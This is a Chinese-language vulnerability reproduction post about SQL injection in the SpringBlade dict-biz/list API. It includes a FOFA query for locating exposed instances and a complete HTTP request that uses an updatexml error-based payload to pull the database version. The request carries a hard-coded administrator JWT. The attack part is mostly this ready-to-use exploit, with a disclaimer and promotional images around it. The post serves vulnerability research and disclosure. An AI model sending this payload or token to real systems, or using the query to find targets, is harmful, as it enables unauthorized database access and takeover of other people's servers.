#  漏洞复现 || SpringBlade dict-biz/list接口SQL注入   
韩文庚  我爱林   2024-05-01 18:18  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
SpringBlade是一款由商业级项目升级优化而来的微服务架构采用Spring Boot 2.7 、Spring Cloud 2021等核心技术构建，提供基于React及Vue的两个前端框架用来快速搭建企业级得SaaS多租户微服务平台。SpringBlade list接口存在SQL注入漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNgpX2oaXlGuficicEaa8Dxct2zhtVDafIEX7recfbJGQmibPA5QNM3rIPmhrBx1NZibxFUB7ITqMN13w/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： (((body="https://bladex.vip" || body="Saber 将不能正常工作"))) 
```  
## 漏洞复现  
  
  
1.利用如下PO  
C进行报错注入获取版本号  
```
GET /api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1 HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Blade-Auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwib2F1dGhfaWQiOiIiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzd29yZCIsImV4cCI6MTc5MTU3MzkyMiwibmJmIjoxNjkxNTcwMzIyfQ.wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A
Accept-Language: zh-CN,zh;q=0.9
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNgpX2oaXlGuficicEaa8Dxctmoz8R53wib507prnOjbuPvFJN3OIH1sxiaL4xtfhC4iaqy8VdcakU1YlA/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
